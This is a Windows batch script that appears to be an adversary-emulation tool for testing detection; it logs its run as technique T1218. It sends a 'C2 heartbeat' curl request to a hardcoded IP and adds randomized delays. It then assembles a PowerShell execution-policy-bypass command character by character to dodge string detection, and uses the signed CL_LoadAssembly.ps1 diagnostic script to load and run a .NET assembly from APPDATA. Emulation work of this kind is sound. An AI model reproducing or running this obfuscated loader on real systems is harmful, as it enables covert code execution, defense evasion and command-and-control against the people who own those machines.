@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\8513\0351faa5
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8513-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=onenote.txt
SET dvhhyc=8513

REM Log file path
SET zkflbm=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initialize random delay variables
SET /A ydovrs=%RANDOM% %% 31 + 30
SET /A uvceq=%RANDOM% %% 11 + 5
SET /A wxrbk=%RANDOM% %% 20 + 10

echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_started=!dvhhyc!>> "!zkflbm!" 2>nul

REM Initial delay
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_start=!ydovrs!s>> "!zkflbm!" 2>nul
timeout /t !ydovrs! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_complete>> "!zkflbm!" 2>nul

REM C2 Heartbeat (DO NOT obfuscate curl)
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_start>> "!zkflbm!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: heartbeat_sent>> "!zkflbm!" 2>nul

REM Delay between operations
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_start=!uvceq!s>> "!zkflbm!" 2>nul
ping -n !uvceq! 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: delay_complete>> "!zkflbm!" 2>nul

REM Build encoded strings for LOLBIN and command parts
SET c1=p
SET c2=o
SET c3=w
SET c4=e
SET c5=r
SET c6=s
SET c7=h
SET c8=e
SET c9=l
SET c10=l
SET c11=.
SET c12=e
SET c13=x
SET c14=e
SET bin1=!c1!!c2!!c3!!c4!!c5!!c6!!c7!!c8!!c9!!c10!!c11!!c12!!c13!!c14!

SET d1=-
SET d2=e
SET d3=p
SET d4= 
SET d5=b
SET d6=y
SET d7=p
SET d8=a
SET d9=s
SET d10=s
SET flag1=!d1!!d2!!d3!!d4!!d5!!d6!!d7!!d8!!d9!!d10!

SET e1=-
SET e2=c
SET e3=o
SET e4=m
SET e5=m
SET e6=a
SET e7=n
SET e8=d
SET flag2=!e1!!e2!!e3!!e4!!e5!!e6!!e7!!e8!

SET f1=s
SET f2=e
SET f3=t
SET f4=-
SET f5=l
SET f6=o
SET f7=c
SET f8=a
SET f9=t
SET f10=i
SET f11=o
SET f12=n
SET f13= 
SET f14=-
SET f15=p
SET f16=a
SET f17=t
SET f18=h
SET f19= 
SET cmd1=!f1!!f2!!f3!!f4!!f5!!f6!!f7!!f8!!f9!!f10!!f11!!f12!!f13!!f14!!f15!!f16!!f17!!f18!!f19!

SET g1=C
SET g2=:
SET g3=\
SET g4=W
SET g5=i
SET g6=n
SET g7=d
SET g8=o
SET g9=w
SET g10=s
SET g11=\
SET g12=d
SET g13=i
SET g14=a
SET g15=g
SET g16=n
SET g17=o
SET g18=s
SET g19=t
SET g20=i
SET g21=c
SET g22=s
SET g23=\
SET g24=s
SET g25=y
SET g26=s
SET g27=t
SET g28=e
SET g29=m
SET g30=\
SET g31=A
SET g32=u
SET g33=d
SET g34=i
SET g35=o
SET path1=!g1!!g2!!g3!!g4!!g5!!g6!!g7!!g8!!g9!!g10!!g11!!g12!!g13!!g14!!g15!!g16!!g17!!g18!!g19!!g20!!g21!!g22!!g23!!g24!!g25!!g26!!g27!!g28!!g29!!g30!!g31!!g32!!g33!!g34!!g35!

SET h1=i
SET h2=m
SET h3=p
SET h4=o
SET h5=r
SET h6=t
SET h7=-
SET h8=m
SET h9=o
SET h10=d
SET h11=u
SET h12=l
SET h13=e
SET h14= 
SET h15=.
SET h16=\
SET cmd2=!h1!!h2!!h3!!h4!!h5!!h6!!h7!!h8!!h9!!h10!!h11!!h12!!h13!!h14!!h15!!h16!

SET j1=C
SET j2=L
SET j3=_
SET j4=L
SET j5=o
SET j6=a
SET j7=d
SET j8=A
SET j9=s
SET j10=s
SET j11=e
SET j12=m
SET j13=b
SET j14=l
SET j15=y
SET j16=.
SET j17=p
SET j18=s
SET j19=1
SET mod1=!j1!!j2!!j3!!j4!!j5!!j6!!j7!!j8!!j9!!j10!!j11!!j12!!j13!!j14!!j15!!j16!!j17!!j18!!j19!

SET k1=L
SET k2=o
SET k3=a
SET k4=d
SET k5=A
SET k6=s
SET k7=s
SET k8=e
SET k9=m
SET k10=b
SET k11=l
SET k12=y
SET k13=F
SET k14=r
SET k15=o
SET k16=m
SET k17=P
SET k18=a
SET k19=t
SET k20=h
SET k21= 
SET func1=!k1!!k2!!k3!!k4!!k5!!k6!!k7!!k8!!k9!!k10!!k11!!k12!!k13!!k14!!k15!!k16!!k17!!k18!!k19!!k20!!k21!

SET m1=[
SET m2=P
SET m3=r
SET m4=o
SET m5=g
SET m6=r
SET m7=a
SET m8=m
SET m9=]
SET m10=:
SET m11=:
SET m12=D
SET m13=a
SET m14=l
SET m15=e
SET m16=(
SET m17=)
SET entry1=!m1!!m2!!m3!!m4!!m5!!m6!!m7!!m8!!m9!!m10!!m11!!m12!!m13!!m14!!m15!!m16!!m17!

REM Random delay
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_start=!wxrbk!s>> "!zkflbm!" 2>nul
timeout /t !wxrbk! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: random_delay_complete>> "!zkflbm!" 2>nul

REM Execute the .NET DLL
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: assembly_load_start=!xzanpex!>> "!zkflbm!" 2>nul

SET RESULT=0
SET ERR_DETAIL=

!bin1! !flag1! !flag2! "!cmd1!!path1!; !cmd2!!mod1!; !func1!!txisnba!\!xzanpex!;!entry1!" >nul 2>nul

IF !ERRORLEVEL! EQU 0 (
    SET RESULT=1
) ELSE (
    SET ERR_DETAIL=assembly_load_failed
)

REM Log TTP execution
SET timestamp=%DATE% %TIME%
echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!>> "!zkflbm!" 2>nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: ttp_logged=!RESULT!>> "!zkflbm!" 2>nul

REM Final delay
CHOICE /C Y /N /D Y /T 15 >nul
echo [%DATE% %TIME%][DEBUG][!jwcnifl!]: script_completed>> "!zkflbm!" 2>nul

ENDLOCAL